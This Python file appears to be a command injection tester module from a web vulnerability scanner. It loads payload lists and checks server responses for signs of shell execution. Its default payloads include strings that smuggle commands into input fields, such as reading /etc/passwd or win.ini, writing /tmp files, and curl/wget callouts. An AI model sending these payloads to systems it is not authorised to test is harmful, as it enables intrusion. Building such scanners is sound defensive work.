"""
Command Injection Vulnerability Tester
"""

import asyncio
import re
import json
from typing import List, Dict
from pathlib import Path
from .base_tester import BaseVulnerabilityTester


class CommandInjectionTester(BaseVulnerabilityTester):
    """Tests for command injection vulnerabilities"""
    
    def __init__(self, scanner_core, config, logger):
        super().__init__(scanner_core, config, logger)
        self._load_payloads()
    
    def _load_payloads(self):
        """Load Command Injection payloads from payloads_master.json"""
        try:
            # Intentar cargar de payloads_master.json primero
            master_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloads_master.json'
            if master_file.exists():
                with open(master_file, 'r', encoding='utf-8') as f:
                    master_data = json.load(f)
                    cmd_data = master_data.get('CommandInjection', {})
                    # Extraer payloads del formato estructurado
                    self.payloads_list = []
                    for payload_obj in cmd_data.get('payloads', []):
                        content = payload_obj.get('content', {})
                        if 'raw' in content:
                            self.payloads_list.append(content['raw'])
                        if 'urlencoded' in content and content['urlencoded'] != content.get('raw'):
                            self.payloads_list.append(content['urlencoded'])
                    
                    if self.payloads_list:
                        self.logger.info(f"Loaded {len(self.payloads_list)} Command Injection payloads from payloads_master.json")
                        # Agregar también los payloads clásicos
                        self.payloads_list.extend(self._get_default_payloads())
                        return
            
            # Fallback a payloadsCommandInjection.json
            payload_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloadsCommandInjection.json'
            with open(payload_file, 'r', encoding='utf-8') as f:
                self.payloads_list = json.load(f)
        except Exception as e:
            self.logger.warning(f"Could not load Command Injection payloads: {e}")
            self.payloads_list = self._get_default_payloads()
    
    def get_payloads(self) -> List[str]:
        """Get command injection payloads"""
        return self.payloads_list
    
    def _get_default_payloads(self) -> List[str]:
        """Default command injection payloads"""
        return [
            # Unix/Linux commands
            '; ls',
            '| ls',
            '` ls `',
            '$( ls )',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; id',
            '| id',
            '; whoami',
            '| whoami',
            '; pwd',
            '| pwd',
            '; uname -a',
            '| uname -a',
            
            # Windows commands
            '& dir',
            '| dir',
            '; dir',
            '& type C:\\Windows\\win.ini',
            '| type C:\\Windows\\win.ini',
            '; ver',
            '| ver',
            '& whoami',
            '| whoami',
            
            # Time-based detection
            '; sleep 5',
            '| sleep 5',
            '& timeout 5',
            '| ping -n 5 127.0.0.1',
            '; ping -c 5 127.0.0.1',
            
            # Newline injection
            '%0a ls',
            '%0d%0a ls',
            '\\n ls',
            '\\r\\n ls',
            
            # With encoding
            '%3B%20ls',
            '%7C%20ls',
            
            # Nested commands
            '; echo $(whoami)',
            '| echo `id`',
            
            # Background execution
            '; ls &',
            '| ls &',
            
            # Multiple commands
            '; ls; pwd',
            '&& ls && pwd',
            '|| ls || pwd',
            
            # File operations
            '; touch /tmp/pwned',
            '| echo pwned > /tmp/test',
            
            # With common command prefixes
            'test; ls',
            'test| ls',
            'test` ls `',
            
            # DNS lookup (for OOB detection)
            '; nslookup example.com',
            '| nslookup example.com',
            
            # Curl/wget (for OOB)
            '; curl http://example.com',
            '| wget http://example.com',
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates command injection"""
        if not response or not baseline:
            return False
        
        response_text = response.text.lower()
        
        # Command output indicators
        command_indicators = [
            # Unix/Linux command outputs
            'root:',
            'bin/bash',
            '/etc/passwd',
            'uid=',
            'gid=',
            'groups=',
            'linux',
            'gnu/',
            'total 0',
            'drwx',
            '-rwx',
            
            # Windows command outputs
            'volume in drive',
            'directory of',
            'windows',
            '<dir>',
            'c:\\',
            'd:\\',
            '[extensions]',
            
            # Network command outputs
            'ping statistics',
            'packets transmitted',
            'ttl=',
            'time=',
            
            # System info
            'kernel',
            'architecture',
            
            # Error messages indicating command execution
            'command not found',
            'is not recognized',
            'bad command',
            'syntax error near',
            'permission denied',
            'no such file or directory',
            'cannot access',
        ]
        
        for indicator in command_indicators:
            if indicator in response_text:
                return True
        
        # Check for directory listing patterns
        dir_patterns = [
            r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}',  # Date timestamp
            r'[drwx-]{10}',  # Unix permissions
            r'total\s+\d+',  # Unix ls output
        ]
        
        for pattern in dir_patterns:
            if re.search(pattern, response_text):
                return True
        
        # Check response time for sleep/timeout commands
        if 'sleep' in payload.lower() or 'timeout' in payload.lower() or 'ping' in payload.lower():
            if hasattr(response, 'elapsed'):
                response_time = response.elapsed.total_seconds()
                if response_time >= 4:  # Allow 1 second margin
                    return True
        
        # Check for significant response differences
        if self._response_differs_significantly(response, baseline):
            # Look for shell-specific characters in response
            if any(char in response_text for char in ['$', '#', '>', '<', '|', '&']):
                return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return command injection vulnerability information"""
        return {
            'name': 'Command Injection',
            'severity': 'critical',
            'description': 'The application is vulnerable to command injection, allowing attackers to execute arbitrary system commands on the server.',
            'cwe': 'CWE-78',
            'owasp': 'A03:2021 - Injection',
            'impact': 'Full system compromise, data theft, malware installation, privilege escalation, and lateral movement.',
            'remediation': 'Never pass user input directly to system commands. Use parameterized APIs, input validation, and least privilege principles.'
        }
